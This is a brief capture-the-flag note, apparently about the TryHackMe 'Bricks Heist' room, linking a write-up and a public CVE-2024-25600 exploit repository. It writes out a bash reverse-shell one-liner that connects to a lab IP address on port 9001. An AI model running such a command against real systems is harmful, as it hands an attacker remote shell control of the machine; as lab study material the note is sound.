> https://medium.com/@timnik/tryhack3m-bricks-heist-a0768e9615bf

reverse shell

```
bash -c 'exec bash -i &>/dev/tcp/192.168.247.244/9001 <&1'
```

was vulnerable to https://github.com/K3ysTr0K3R/CVE-2024-25600-EXPLOIT
